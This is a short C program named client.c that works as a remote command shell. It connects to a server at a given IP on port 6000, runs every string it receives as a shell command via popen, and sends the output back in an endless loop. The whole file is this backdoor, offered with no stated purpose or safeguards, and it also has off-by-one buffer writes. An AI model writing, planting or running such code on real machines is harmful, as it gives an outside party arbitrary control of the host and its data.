/*************************************************************************
	> File Name: client.c
# Author: rsq
# mail: rsqmail@163.com
	> Created Time: 2013年04月04日 星期四 16时53分20秒
 ************************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h>
#define SERV_PORT 6000
#define MAXLINE 10240
int main(int argc, char **argv)
{
	int sockfd;
	struct sockaddr_in servaddr;
	char msg[MAXLINE];
	int n;
	FILE *fp;

	if(argc!=2){
		fprintf(stderr, "usage: client <IPaddress>\n");
		exit(1);
	}
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0))<0){
		fprintf(stderr, "create socket error\n");
		exit(-1);
	}
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(SERV_PORT);
	inet_aton(argv[1], &servaddr.sin_addr);

	if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0){
		fprintf(stderr, "connect to server error\n");
		exit(-1);
	}
	while(1){
		//n = read(sockfd, msg, MAXLINE);
		n = recv(sockfd, msg, MAXLINE, 0);
		if(n>0){
			msg[n]=0;
			//system(msg);
			fp = popen(msg, "r");
			n = fread(msg, sizeof(char), sizeof(msg), fp);
			msg[n]=0;
			printf("%d\n%s\n", n, msg);
			pclose(fp);
		}
		write(sockfd, msg, strlen(msg)+1);
	}
	close(sockfd);
	return 0;
}
